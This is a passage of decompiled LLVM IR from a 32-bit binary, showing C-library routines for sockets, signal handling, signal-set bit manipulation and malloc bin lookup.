  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804a133 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804a13a = call i32 @__socketcall(i32 9, i32 %v2_804a133)
  ret i32 %v2_804a13a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804a15f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804a166 = call i32 @__socketcall(i32 1, i32 %v2_804a15f)
  ret i32 %v2_804a166

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 4, 3, 0, 2, 1 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804a170 = load i32, i32* @ebx, align 4
  %v15_804a171 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804a185 = icmp eq i32 %arg2, -1
  br i1 %v10_804a185, label %dec_label_pc_804a193, label %dec_label_pc_804a18a

dec_label_pc_804a18a:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804a193, label %dec_label_pc_804a18e

dec_label_pc_804a18e:                             ; preds = %dec_label_pc_804a18a
  %v7_804a191 = icmp sgt i32 %arg1, 64
  br i1 %v7_804a191, label %dec_label_pc_804a193, label %dec_label_pc_804a1a0

dec_label_pc_804a193:                             ; preds = %dec_label_pc_804a18e, %dec_label_pc_804a18a, %entry
  %v1_804a193 = call i32 @__errno_location(i32 %v0_804a170)
  store i32 %v1_804a193, i32* %eax.global-to-local, align 4
  %v1_804a198 = inttoptr i32 %v1_804a193 to i32*
  store i32 22, i32* %v1_804a198, align 4
  br label %dec_label_pc_804a214

dec_label_pc_804a1a0:                             ; preds = %dec_label_pc_804a18e
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1ae

dec_label_pc_804a1ae:                             ; preds = %dec_label_pc_804a1ae.dec_label_pc_804a1ae_crit_edge, %dec_label_pc_804a1a0
  %v0_804a1ae = phi i32 [ %v15_804a171, %dec_label_pc_804a1a0 ], [ %v0_804a1ae.pre, %dec_label_pc_804a1ae.dec_label_pc_804a1ae_crit_edge ]
  %v1_804a1b917 = phi i32 [ 31, %dec_label_pc_804a1a0 ], [ %v1_804a1b9, %dec_label_pc_804a1ae.dec_label_pc_804a1ae_crit_edge ]
  %v2_804a1ae = mul i32 %v1_804a1b917, 4
  %v3_804a1ae = add i32 %v2_804a1ae, 160
  %v4_804a1ae = add i32 %v3_804a1ae, %v0_804a1ae
  %v5_804a1ae = inttoptr i32 %v4_804a1ae to i32*
  store i32 0, i32* %v5_804a1ae, align 4
  %v0_804a1b9.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804a1b9 = add i32 %v0_804a1b9.pre, -1
  %v9_804a1b9 = icmp slt i32 %v1_804a1b9, 0
  store i32 %v1_804a1b9, i32* %eax.global-to-local, align 4
  %v1_804a1ba = icmp eq i1 %v9_804a1b9, false
  br i1 %v1_804a1ba, label %dec_label_pc_804a1ae.dec_label_pc_804a1ae_crit_edge, label %dec_label_pc_804a1bc

dec_label_pc_804a1ae.dec_label_pc_804a1ae_crit_edge: ; preds = %dec_label_pc_804a1ae
  %v0_804a1ae.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a1ae

dec_label_pc_804a1bc:                             ; preds = %dec_label_pc_804a1ae
  %v0_804a1bc = load i32, i32* @edx, align 4
  %v2_804a1bf = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804a1bf, i32* %eax.global-to-local, align 4
  %v4_804a1c7 = call i32 @__sigaddset(i32 %v2_804a1bf, i32 %arg1, i32 %v0_804a1bc, i32 %v0_804a1bc)
  store i32 %v4_804a1c7, i32* %eax.global-to-local, align 4
  %v2_804a1cf = icmp slt i32 %v4_804a1c7, 0
  br i1 %v2_804a1cf, label %dec_label_pc_804a214, label %dec_label_pc_804a1d3

dec_label_pc_804a1d3:                             ; preds = %dec_label_pc_804a1bc
  %v4_804a1db = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8054580.35 to i32), i32 %arg1, i32 %v4_804a1c7, i32 %v4_804a1c7)
  %v2_804a1f4 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804a1f9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804a1f9, i32* %eax.global-to-local, align 4
  %v4_804a202 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804a1f4)
  store i32 %v4_804a202, i32* %eax.global-to-local, align 4
  %v2_804a20a = icmp slt i32 %v4_804a202, 0
  br i1 %v2_804a20a, label %dec_label_pc_804a214, label %dec_label_pc_804a20e

dec_label_pc_804a20e:                             ; preds = %dec_label_pc_804a1d3
  %v3_804a20e = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804a217

dec_label_pc_804a214:                             ; preds = %dec_label_pc_804a1d3, %dec_label_pc_804a1bc, %dec_label_pc_804a193
  br label %dec_label_pc_804a217

dec_label_pc_804a217:                             ; preds = %dec_label_pc_804a20e, %dec_label_pc_804a214
  %storemerge = phi i32 [ -1, %dec_label_pc_804a214 ], [ %v3_804a20e, %dec_label_pc_804a20e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804a170, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804a1b9, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804a217, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804a22e = add i32 %arg2, -1
  %v1_804a231 = urem i32 %v1_804a22e, 32
  %v2_804a231 = icmp eq i32 %v1_804a231, 0
  %v2_804a234 = udiv i32 %v1_804a22e, 32
  br i1 %v2_804a231, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804a237 = shl i32 1, %v1_804a231
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804a239 = phi i32 [ 1, %entry ], [ %v5_804a237, %bb ]
  %v2_804a239 = mul nuw nsw i32 %v2_804a234, 4
  %v3_804a239 = add i32 %v2_804a239, %arg1
  %v4_804a239 = inttoptr i32 %v3_804a239 to i32*
  %v5_804a239 = load i32, i32* %v4_804a239, align 4
  %v7_804a239 = and i32 %v5_804a239, %v6_804a239
  %v8_804a239 = icmp eq i32 %v7_804a239, 0
  %v1_804a23d = icmp eq i1 %v8_804a239, false
  %v2_804a23d = zext i1 %v1_804a23d to i32
  ret i32 %v2_804a23d

; uselistorder directives
  uselistorder i32 %v1_804a231, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a244 = load i32, i32* @ebx, align 4
  store i32 %v0_804a244, i32* %stack_var_-4, align 4
  %v1_804a252 = add i32 %arg2, -1
  %v1_804a255 = urem i32 %v1_804a252, 32
  %v2_804a255 = icmp eq i32 %v1_804a255, 0
  store i32 %v1_804a255, i32* @ecx, align 4
  %v2_804a258 = udiv i32 %v1_804a252, 32
  store i32 %v2_804a258, i32* @edx, align 4
  br i1 %v2_804a255, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804a25b = shl i32 1, %v1_804a255
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804a25d = phi i32 [ 1, %entry ], [ %v5_804a25b, %bb ]
  %v2_804a25d = mul nuw nsw i32 %v2_804a258, 4
  %v3_804a25d = add i32 %v2_804a25d, %arg1
  %v4_804a25d = inttoptr i32 %v3_804a25d to i32*
  %v5_804a25d = load i32, i32* %v4_804a25d, align 4
  %v7_804a25d = or i32 %v5_804a25d, %v6_804a25d
  store i32 %v7_804a25d, i32* %v4_804a25d, align 4
  %v2_804a262 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a262, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804a258, { 1, 0 }
  uselistorder i32 %v1_804a255, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804a272 = add i32 %arg2, -1
  %v1_804a275 = urem i32 %v1_804a272, 32
  %v2_804a275 = icmp eq i32 %v1_804a275, 0
  %v2_804a278 = udiv i32 %v1_804a272, 32
  br i1 %v2_804a275, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_804a27b = shl i32 -2, %v1_804a275
  %v5_804a27b = sub nsw i32 32, %v1_804a275
  %v6_804a27b = lshr i32 -2, %v5_804a27b
  %v7_804a27b = or i32 %v6_804a27b, %v4_804a27b
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804a27d = phi i32 [ -2, %entry ], [ %v7_804a27b, %bb ]
  %v2_804a27d = mul nuw nsw i32 %v2_804a278, 4
  %v3_804a27d = add i32 %v2_804a27d, %arg1
  %v4_804a27d = inttoptr i32 %v3_804a27d to i32*
  %v5_804a27d = load i32, i32* %v4_804a27d, align 4
  %v7_804a27d = and i32 %v5_804a27d, %v6_804a27d
  store i32 %v7_804a27d, i32* %v4_804a27d, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804a275, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804a284 = load i32, i32* @eax, align 4
  %v6_804a297 = icmp ugt i32 %v0_804a284, 16777215
  br i1 %v6_804a297, label %dec_label_pc_804a2a8, label %dec_label_pc_804a299

dec_label_pc_804a299:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804a284, 256
  %v2_804a287 = udiv i32 %v0_804a284, 256
  %v2_804a299 = call i32 @llvm.ctlz.i32(i32 %v2_804a287, i1 true)
  %v3_804a299 = xor i32 %v2_804a299, 31
  %v5_804a299 = select i1 %tmp, i32 95, i32 %v3_804a299
  %v1_804a29c = add nuw nsw i32 %v5_804a299, 6
  store i32 %v1_804a29c, i32* @ecx, align 4
  %v2_804a29f = urem i32 %v1_804a29c, 32
  %v4_804a29f = icmp eq i32 %v2_804a29f, 0
  br i1 %v4_804a29f, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804a299
  %v5_804a29f = lshr i32 %v0_804a284, %v2_804a29f
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804a299, %bb
  %v0_804a2a1 = phi i32 [ %v0_804a284, %dec_label_pc_804a299 ], [ %v5_804a29f, %bb ]
  %v1_804a2a1 = urem i32 %v0_804a2a1, 4
  %v2_804a2a4 = mul nuw nsw i32 %v5_804a299, 4
  %v3_804a2a4 = or i32 %v1_804a2a1, 32
  %v4_804a2a4 = add nuw nsw i32 %v3_804a2a4, %v2_804a2a4
  br label %dec_label_pc_804a2a8

dec_label_pc_804a2a8:                             ; preds = %entry, %bb4
  %v0_804a2a9 = phi i32 [ 95, %entry ], [ %v4_804a2a4, %bb4 ]
  ret i32 %v0_804a2a9

; uselistorder directives
  uselistorder i32 %v2_804a29f, { 1, 0 }
  uselistorder i32 %v0_804a284, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804a2a8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a2aa = load i32, i32* @ebp, align 4
  %v0_804a2ab = load i32, i32* @edi, align 4
  %v0_804a2ac = load i32, i32* @esi, align 4
  %v0_804a2ad = load i32, i32* @ebx, align 4
  store i32 %v0_804a2ad, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804a2bf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a2bf, i32* @eax, align 4
  store i32 %v2_804a2bf, i32* %stack_var_-92, align 4
  %v2_804a2c4 = call i32 @__pthread_return_void(i32 %v2_804a2bf, i32 134526427)
  store i32 %v2_804a2c4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052044.36 to i32), i32* %stack_var_-92, align 4
  %v1_804a2d0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052044.36 to i32))
  store i32 %v1_804a2d0, i32* %eax.global-to-local, align 4
  %v0_804a2d8 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804a2d8, -32
  br i1 %tmp125, label %dec_label_pc_804a2ef, label %dec_label_pc_804a2dd

dec_label_pc_804a2dd:                             ; preds = %entry
  %v0_804a2dd = load i32, i32* %stack_var_-92, align 4
  %v1_804a2dd = call i32 @__errno_location(i32 %v0_804a2dd)
  store i32 %v1_804a2dd, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804a2e4 = inttoptr i32 %v1_804a2dd to i32*
  store i32 12, i32* %v1_804a2e4, align 4
  br label %dec_label_pc_804aa14

dec_label_pc_804a2ef:                             ; preds = %entry
  %v1_804a2ef = add i32 %v0_804a2d8, 11
  %tmp126 = icmp ult i32 %v1_804a2ef, 16
  br i1 %tmp126, label %dec_label_pc_804a306, label %dec_label_pc_804a2ff

dec_label_pc_804a2ff:                             ; preds = %dec_label_pc_804a2ef
  %v1_804a2ff = and i32 %v1_804a2ef, -8
  br label %dec_label_pc_804a306

dec_label_pc_804a306:                             ; preds = %dec_label_pc_804a2ef, %dec_label_pc_804a2ff
  %storemerge136 = phi i32 [ %v1_804a2ff, %dec_label_pc_804a2ff ], [ %v1_804a2ef, %dec_label_pc_804a2ef ]
  %v1_804a69e = phi i32 [ %v1_804a2ff, %dec_label_pc_804a2ff ], [ 16, %dec_label_pc_804a2ef ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804a306 = load i8, i8* @global_var_8054600.37, align 1
  %v1_804a306 = sext i8 %v0_804a306 to i32
  store i32 %v1_804a306, i32* @ebx, align 4
  %v3_804a30c = urem i8 %v0_804a306, 2
  %v4_804a30c = icmp eq i8 %v3_804a30c, 0
  %v1_804a30f = icmp eq i1 %v4_804a30c, false
  br i1 %v1_804a30f, label %dec_label_pc_804a32e, label %dec_label_pc_804a311

dec_label_pc_804a311:                             ; preds = %dec_label_pc_804a306
  %v2_804a311 = icmp eq i8 %v0_804a306, 0
  %v1_804a313 = icmp eq i1 %v2_804a311, false
  br i1 %v1_804a313, label %dec_label_pc_804a609, label %dec_label_pc_804a319

dec_label_pc_804a319:                             ; preds = %dec_label_pc_804a311
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a321 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804a321, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a609

dec_label_pc_804a32e:                             ; preds = %dec_label_pc_804a306
  %v11_804a32e = trunc i32 %v1_804a69e to i8
  %v8_804a332 = icmp ugt i8 %v11_804a32e, %v0_804a306
  br i1 %v8_804a332, label %dec_label_pc_804a34f, label %dec_label_pc_804a334

dec_label_pc_804a334:                             ; preds = %dec_label_pc_804a32e
  %v2_804a338 = udiv i32 %v1_804a69e, 2
  store i32 %v2_804a338, i32* %eax.global-to-local, align 4
  %v1_804a33a = add i32 %v2_804a338, ptrtoint (i8* @global_var_8054600.37 to i32)
  store i32 %v1_804a33a, i32* @ecx, align 4
  %v1_804a340 = add i32 %v2_804a338, add (i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32 -4)
  %v2_804a340 = inttoptr i32 %v1_804a340 to i32*
  %v3_804a340 = load i32, i32* %v2_804a340, align 4
  store i32 %v3_804a340, i32* @edx, align 4
  %v1_804a343 = icmp eq i32 %v3_804a340, 0
  br i1 %v1_804a343, label %dec_label_pc_804a34f, label %dec_label_pc_804a347

dec_label_pc_804a347:                             ; preds = %dec_label_pc_804a334
  %v1_804a347 = add i32 %v3_804a340, 8
  %v2_804a347 = inttoptr i32 %v1_804a347 to i32*
  %v3_804a347 = load i32, i32* %v2_804a347, align 4
  store i32 %v3_804a347, i32* %eax.global-to-local, align 4
  store i32 %v3_804a347, i32* %v2_804a340, align 4
  br label %dec_label_pc_804a388

dec_label_pc_804a34f:                             ; preds = %dec_label_pc_804a334, %dec_label_pc_804a32e
  %v8_804a34f = icmp ult i32 %v1_804a69e, 255
  %v6_804a357 = icmp ugt i32 %v1_804a69e, 255
  store i32 %v1_804a69e, i32* @eax, align 4
  br i1 %v6_804a357, label %dec_label_pc_804a390, label %dec_label_pc_804a359

dec_label_pc_804a359:                             ; preds = %dec_label_pc_804a34f
  %v2_804a35d = udiv i32 %v1_804a69e, 8
  store i32 %v2_804a35d, i32* %eax.global-to-local, align 4
  %v1_804a364 = mul nuw i32 %v2_804a35d, 8
  %v2_804a364 = add i32 %v1_804a364, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a364, i32* @ecx, align 4
  %v1_804a36b = add i32 %v1_804a364, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a36b = inttoptr i32 %v1_804a36b to i32*
  %v3_804a36b = load i32, i32* %v2_804a36b, align 4
  store i32 %v3_804a36b, i32* @edx, align 4
  %v12_804a36e = icmp eq i32 %v3_804a36b, %v2_804a364
  br i1 %v12_804a36e, label %dec_label_pc_804a48c.preheader, label %dec_label_pc_804a376

dec_label_pc_804a376:                             ; preds = %dec_label_pc_804a359
  store i32 %v1_804a69e, i32* %ebx.global-to-local, align 4
  %v1_804a37a = add i32 %v3_804a36b, 12
  %v2_804a37a = inttoptr i32 %v1_804a37a to i32*
  %v3_804a37a = load i32, i32* %v2_804a37a, align 4
  store i32 %v3_804a37a, i32* %eax.global-to-local, align 4
  store i32 %v3_804a37a, i32* %v2_804a36b, align 4
  %v0_804a380 = load i32, i32* @edx, align 4
  %v1_804a380 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a380 = add i32 %v0_804a380, 4
  %v3_804a380 = add i32 %v2_804a380, %v1_804a380
  %v4_804a380 = inttoptr i32 %v3_804a380 to i32*
  %v5_804a380 = load i32, i32* %v4_804a380, align 4
  %v6_804a380 = or i32 %v5_804a380, 1
  store i32 %v6_804a380, i32* %v4_804a380, align 4
  %v0_804a385 = load i32, i32* @ecx, align 4
  %v1_804a385 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a385 = add i32 %v1_804a385, 8
  %v3_804a385 = inttoptr i32 %v2_804a385 to i32*
  store i32 %v0_804a385, i32* %v3_804a385, align 4
  br label %dec_label_pc_804a388

dec_label_pc_804a388:                             ; preds = %dec_label_pc_804a725, %dec_label_pc_804a737, %dec_label_pc_804a347, %dec_label_pc_804a376
  %v0_804a388 = load i32, i32* @edx, align 4
  %v1_804a388 = add i32 %v0_804a388, 8
  store i32 %v1_804a388, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804aa03

dec_label_pc_804a390:                             ; preds = %dec_label_pc_804a34f
  %v0_804a394 = call i32 @__malloc_largebin_index()
  store i32 %v0_804a394, i32* %eax.global-to-local, align 4
  %v3_804a399 = and i8 %v0_804a306, 2
  %v4_804a399 = icmp eq i8 %v3_804a399, 0
  %v6_804a399 = zext i8 %v3_804a399 to i32
  %v9_804a399 = and i32 %v1_804a306, -256
  %v10_804a399 = or i32 %v9_804a399, %v6_804a399
  store i32 %v10_804a399, i32* @ebx, align 4
  br i1 %v4_804a399, label %dec_label_pc_804a48c.preheader, label %dec_label_pc_804a3a6

dec_label_pc_804a3a6:                             ; preds = %dec_label_pc_804a390
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a3ae = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804a3ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a48c.preheader

dec_label_pc_804a48c.preheader:                   ; preds = %dec_label_pc_804a3a6, %dec_label_pc_804a359, %dec_label_pc_804a390
  %stack_var_-40.0.ph = phi i32 [ %v2_804a35d, %dec_label_pc_804a359 ], [ %v0_804a394, %dec_label_pc_804a3a6 ], [ %v0_804a394, %dec_label_pc_804a390 ]
  %v1_804a3e2 = add i32 %v1_804a69e, 16
  %v0_804a48c107 = load i32, i32* @global_var_8054640.41, align 64
  store i32 %v0_804a48c107, i32* @ebp, align 4
  %v9_804a492109 = icmp eq i32 %v0_804a48c107, 134563380
  %v1_804a498110 = icmp eq i1 %v9_804a492109, false
  br i1 %v1_804a498110, label %dec_label_pc_804a3bb, label %dec_label_pc_804a49e

dec_label_pc_804a3bb:                             ; preds = %dec_label_pc_804a48c.preheader, %bb84
  %v0_804a48c111 = phi i32 [ %v0_804a48c, %bb84 ], [ %v0_804a48c107, %dec_label_pc_804a48c.preheader ]
  %v1_804a3bb = add i32 %v0_804a48c111, 4
  %v2_804a3bb = inttoptr i32 %v1_804a3bb to i32*
  %v3_804a3bb = load i32, i32* %v2_804a3bb, align 4
  %v1_804a3be = add i32 %v0_804a48c111, 12
  %v2_804a3be = inttoptr i32 %v1_804a3be to i32*
  %v3_804a3be = load i32, i32* %v2_804a3be, align 4
  store i32 %v3_804a3be, i32* @edx, align 4
  %v1_804a3c1 = and i32 %v3_804a3bb, -4
  store i32 %v1_804a3c1, i32* @edi, align 4
  br i1 %v6_804a357, label %dec_label_pc_804a3ed, label %dec_label_pc_804a3ce

dec_label_pc_804a3ce:                             ; preds = %dec_label_pc_804a3bb
  %v9_804a3ce = icmp eq i32 %v3_804a3be, 134563380
  %v1_804a3d4 = icmp eq i1 %v9_804a3ce, false
  br i1 %v1_804a3d4, label %dec_label_pc_804a3ed, label %dec_label_pc_804a3d6

dec_label_pc_804a3d6:                             ; preds = %dec_label_pc_804a3ce
  %v1_804a3d6 = load i32, i32* @global_var_8054630.39, align 16
  %v12_804a3d6 = icmp eq i32 %v0_804a48c111, %v1_804a3d6
  %v1_804a3dc = icmp eq i1 %v12_804a3d6, false
  br i1 %v1_804a3dc, label %dec_label_pc_804a3ed, label %dec_label_pc_804a3de

dec_label_pc_804a3de:                             ; preds = %dec_label_pc_804a3d6
  store i32 %v1_804a3e2, i32* %eax.global-to-local, align 4
  %v6_804a3e7 = icmp ugt i32 %v1_804a3c1, %v1_804a3e2
  br i1 %v6_804a3e7, label %dec_label_pc_804a99e, label %dec_label_pc_804a3ed

dec_label_pc_804a3ed:                             ; preds = %dec_label_pc_804a3de, %dec_label_pc_804a3d6, %dec_label_pc_804a3ce, %dec_label_pc_804a3bb
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %eax.global-to-local, align 4
  %v2_804a3f2 = add i32 %v3_804a3be, 8
  %v3_804a3f2 = inttoptr i32 %v2_804a3f2 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v3_804a3f2, align 4
  %v0_804a3f5 = load i32, i32* @edx, align 4
  store i32 %v0_804a3f5, i32* @global_var_8054640.41, align 4
  %v0_804a3f8 = load i32, i32* @edi, align 4
  %v15_804a3f8 = icmp eq i32 %v0_804a3f8, %v1_804a69e
  br i1 %v15_804a3f8, label %dec_label_pc_804a9df, label %dec_label_pc_804a402

dec_label_pc_804a402:                             ; preds = %dec_label_pc_804a3ed
  %v6_804a408 = icmp ugt i32 %v0_804a3f8, 255
  br i1 %v6_804a408, label %dec_label_pc_804a41b, label %dec_label_pc_804a40a

dec_label_pc_804a40a:                             ; preds = %dec_label_pc_804a402
  %v2_804a40c = udiv i32 %v0_804a3f8, 8
  store i32 %v2_804a40c, i32* %esi.global-to-local, align 4
  %v1_804a40f = mul nuw i32 %v2_804a40c, 8
  %v2_804a40f = add i32 %v1_804a40f, 134563372
  store i32 %v2_804a40f, i32* @ebx, align 4
  %v1_804a416 = add i32 %v1_804a40f, 134563380
  %v2_804a416 = inttoptr i32 %v1_804a416 to i32*
  %v3_804a416 = load i32, i32* %v2_804a416, align 4
  store i32 %v3_804a416, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a464

dec_label_pc_804a41b:                             ; preds = %dec_label_pc_804a402
  store i32 %v0_804a3f8, i32* @eax, align 4
  %v0_804a41d = call i32 @__malloc_largebin_index()
  store i32 %v0_804a41d, i32* %esi.global-to-local, align 4
  %v1_804a424 = mul i32 %v0_804a41d, 8
  %v2_804a424 = add i32 %v1_804a424, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a424, i32* %eax.global-to-local, align 4
  %v1_804a42b = add i32 %v1_804a424, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 8)
  %v2_804a42b = inttoptr i32 %v1_804a42b to i32*
  %v3_804a42b = load i32, i32* %v2_804a42b, align 4
  store i32 %v3_804a42b, i32* %edx.global-to-local, align 4
  store i32 %v3_804a42b, i32* @ebx, align 4
  %v12_804a434 = icmp eq i32 %v3_804a42b, %v2_804a424
  br i1 %v12_804a434, label %dec_label_pc_804a464, label %dec_label_pc_804a438

dec_label_pc_804a438:                             ; preds = %dec_label_pc_804a41b
  %v1_804a438 = add i32 %v1_804a424, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a438 = inttoptr i32 %v1_804a438 to i32*
  %v3_804a438 = load i32, i32* %v2_804a438, align 4
  store i32 %v3_804a438, i32* @ebx, align 4
  %v0_804a43b = load i32, i32* @edi, align 4
  %v2_804a43b = add i32 %v3_804a438, 4
  %v3_804a43b = inttoptr i32 %v2_804a43b to i32*
  %v4_804a43b = load i32, i32* %v3_804a43b, align 4
  %v10_804a43b = icmp ult i32 %v0_804a43b, %v4_804a43b
  %v1_804a43e = icmp eq i1 %v10_804a43b, false
  br i1 %v1_804a43e, label %dec_label_pc_804a446, label %dec_label_pc_804a464

dec_label_pc_804a446:                             ; preds = %dec_label_pc_804a438
  %v1_804a448 = or i32 %v0_804a43b, 1
  store i32 %v1_804a448, i32* %eax.global-to-local, align 4
  store i32 %v3_804a42b, i32* %ebx.global-to-local, align 4
  %v2_804a45c101 = add i32 %v3_804a42b, 4
  %v3_804a45c102 = inttoptr i32 %v2_804a45c101 to i32*
  %v4_804a45c103 = load i32, i32* %v3_804a45c102, align 4
  %v10_804a45c104 = icmp ult i32 %v1_804a448, %v4_804a45c103
  br i1 %v10_804a45c104, label %dec_label_pc_804a44d, label %dec_label_pc_804a461

dec_label_pc_804a44d:                             ; preds = %dec_label_pc_804a446, %dec_label_pc_804a44d
  %v0_804a461105 = phi i32 [ %v3_804a451, %dec_label_pc_804a44d ], [ %v3_804a42b, %dec_label_pc_804a446 ]
  store i32 %v0_804a461105, i32* %ecx.global-to-local, align 4
  %v1_804a451 = add i32 %v0_804a461105, 8
  %v2_804a451 = inttoptr i32 %v1_804a451 to i32*
  %v3_804a451 = load i32, i32* %v2_804a451, align 4
  store i32 %v3_804a451, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a451, i32* %ebx.global-to-local, align 4
  %v2_804a45c = add i32 %v3_804a451, 4
  %v3_804a45c = inttoptr i32 %v2_804a45c to i32*
  %v4_804a45c = load i32, i32* %v3_804a45c, align 4
  %v10_804a45c = icmp ult i32 %v1_804a448, %v4_804a45c
  br i1 %v10_804a45c, label %dec_label_pc_804a44d, label %dec_label_pc_804a461

dec_label_pc_804a461:                             ; preds = %dec_label_pc_804a44d, %dec_label_pc_804a446
  %v0_804a461.lcssa = phi i32 [ %v3_804a42b, %dec_label_pc_804a446 ], [ %v3_804a451, %dec_label_pc_804a44d ]
  %v1_804a461 = add i32 %v0_804a461.lcssa, 12
  %v2_804a461 = inttoptr i32 %v1_804a461 to i32*
  %v3_804a461 = load i32, i32* %v2_804a461, align 4
  store i32 %v3_804a461, i32* @ebx, align 4
  br label %dec_label_pc_804a464

dec_label_pc_804a464:                             ; preds = %dec_label_pc_804a40a, %dec_label_pc_804a438, %dec_label_pc_804a41b, %dec_label_pc_804a461
  %v0_804a464 = phi i32 [ %v0_804a41d, %dec_label_pc_804a41b ], [ %v0_804a41d, %dec_label_pc_804a461 ], [ %v0_804a41d, %dec_label_pc_804a438 ], [ %v2_804a40c, %dec_label_pc_804a40a ]
